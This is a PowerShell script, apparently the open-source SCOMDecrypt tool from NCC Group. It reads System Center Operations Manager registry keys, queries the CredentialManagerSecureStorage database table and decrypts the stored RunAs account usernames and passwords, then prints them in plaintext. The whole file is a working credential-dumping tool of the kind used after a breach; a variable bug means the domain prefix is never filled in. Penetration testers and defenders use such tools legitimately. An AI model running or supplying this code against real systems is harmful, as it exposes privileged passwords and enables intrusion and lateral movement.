<#
Released as open source by NCC Group Plc - http://www.nccgroup.com/

Developed by Richard Warren, richard dot warren at nccgroup dot trust

Edited by Blake Drumm

https://www.github.com/nccgroup/SCOMDecrypt

Released under AGPL see LICENSE for more information
#>

function Invoke-SCOMDecrypt
{
	[CmdletBinding()]
	Param (
		[switch]$Passthru
	)
	# Check if SCOM is installed
	[string]$installDirectory = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\System Center\2010\Common\Setup").InstallDirectory
	if (Test-Path $installDirectory)
	{
		$Full_Path = [System.IO.Path]::GetFullPath($installDirectory);
		[string]$PATH1 = [System.IO.Path]::GetFullPath("$Full_Path`Microsoft.Mom.Sdk.SecureStorageManager.dll")
		[System.Reflection.Assembly]::LoadFile($PATH1) | Out-Null
		[string]$PATH2 = [System.IO.Path]::GetFullPath("$Full_Path`Microsoft.EnterpriseManagement.DataAccessLayer.dll")
		[System.Reflection.Assembly]::LoadFile($PATH2) | Out-Null
	}
	else
	{
		Write-Host "[Critical Error] Unable to find installation directory of SCOM" -ForegroundColor Yellow
		return
	}
	
	$scom = New-Object Microsoft.EnterpriseManagement.Security.SecureStorageManager
	$server = $null
	$database = $null
	$key = $null
	
	Try
	{
		$reg = Get-ItemProperty "HKLM:SOFTWARE\Microsoft\System Center\2010\Common\Database" -erroraction stop
		$server = $reg.DatabaseServerName
		$database = $reg.DatabaseName
	}
	Catch [System.Management.Automation.ItemNotFoundException]
	{
		Write-Host "[Critical Error] Unable to detect SQL server"
		return
	}
	
	Try
	{
		$reg = Get-ItemProperty "HKLM:SOFTWARE\Microsoft\System Center\2010\Common\MOMBins" -erroraction stop
		$key = $reg.Value1
	}
	Catch [System.Management.Automation.ItemNotFoundException]
	{
		Write-Host "[Critical Error] Unable to find key"
		return
	}
	
	$sqlCommand = "SELECT UserName, Data, Domain FROM dbo.CredentialManagerSecureStorage;"
	$connectionString = "Server=$server;Database=$database;Trusted_Connection=True;"
	$connection = new-object system.data.SqlClient.SQLConnection($connectionString)
	$command = new-object system.data.sqlclient.sqlcommand($sqlCommand, $connection)
	$connection.Open()
	$adapter = New-Object System.Data.sqlclient.sqlDataAdapter $command
	$dataset = New-Object System.Data.DataSet
	$adapter.Fill($dataSet) | Out-Null
	$connection.Close()
	
	for ($i = 0; $i -lt $dataset.Tables[0].Rows.Count; $i++)
	{
		if ($dataset.Tables[0].Rows[$i].Data -ne [System.DBNull]::Value -and $dataset.Tables[0].Rows[$i].Username -ne [System.DBNull]::Value)
		{
			$user = $dataset.Tables[0].Rows[$i].Username
			$passw = [System.Text.Encoding]::UTF8.GetString($scom.Decrypt($dataset.Tables[0].Rows[$i].Data))
			
			# Cleans up the spaces in the password
			$truePass = ""
			for ($j = 0; $j -lt $passw.Length; $j++)
			{
				if ($j % 2 -eq 0)
				{
					$truePass += $passw[$j]
				}
			}
			
			# Create PSObject with credentials
			$credentialObj = New-Object PSObject -Property @{
				Username = if ($domain -notlike "") { "$domain\$user" } else { $user }
				Password = $truePass
			}
			
			if ($Passthru)
			{
				# Output the object
				Write-Output $($credentialObj | Select-Object -Property Username, Password)
			}
			else
			{
				# Output as normal string
				Write-Host "____________________________________"
				Write-Host "Username: $($credentialObj.Username)"
				Write-Host "Password: $($credentialObj.Password)"
				Write-Host " "
			}
		}
	}
}
